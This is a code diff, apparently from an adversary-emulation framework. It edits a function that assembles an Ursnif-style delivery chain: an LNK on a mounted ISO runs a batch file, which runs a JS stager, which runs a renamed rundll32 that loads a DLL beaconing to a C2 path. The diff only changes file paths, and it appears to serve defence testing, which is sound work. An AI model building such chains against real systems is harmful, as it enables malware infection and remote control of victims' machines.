@@ -73,25 +73,25 @@ def ursnif(baseUrl) -> List[AceRoute]:
     host = parsed_url.hostname
     port = parsed_url.port
     itsItdb = makePeExecCmdC2(host, port, '/ursnif/c2', asDll=True)
-    itsItdbFile: AceFile = makeAceFile('itsIt.db', itsItdb)
+    itsItdbFile: AceFile = makeAceFile('me/itsIt.db', itsItdb)
 
     # Stage 2: canWell.js -> 123.com/rundll32.exe -> itsIt.db
     canWellJs: AceBytes = readFileContent('recipes/ursnif/canWell.js')
-    canWellJsFile: AceFile = makeAceFile('canWell.js', canWellJs)
+    canWellJsFile: AceFile = makeAceFile('me/canWell.js', canWellJs)
 
     # Stage 1: alsoOne.bat -> canWell.js
     alsoOneBat: AceBytes = readFileContent('recipes/ursnif/alsoOne.bat')
-    alsoOneBatFile: AceFile = makeAceFile('alsoOne.bat', alsoOneBat)
+    alsoOneBatFile: AceFile = makeAceFile('me/alsoOne.bat', alsoOneBat)
 
     # Renamed rundll32.exe
     com123: AceBytes = readFileContent('recipes/ursnif/rundll32.exe')
-    com123File: AceFile = makeAceFile('123.com', com123)
+    com123File: AceFile = makeAceFile('me/123.com', com123)
 
     # LNK -> alsoOne.bat
     # Only works if ISO is mounted as F:
     lnkData: AceBytes = makeLnk(
         name = "6570872.lnk",
-        target = "F:\\alsoOne.bat",
+        target = "F:\\me\\alsoOne.bat",
         arguments = '',
         iconPath="C:\\Windows\\explorer.exe",
         iconIndex=0
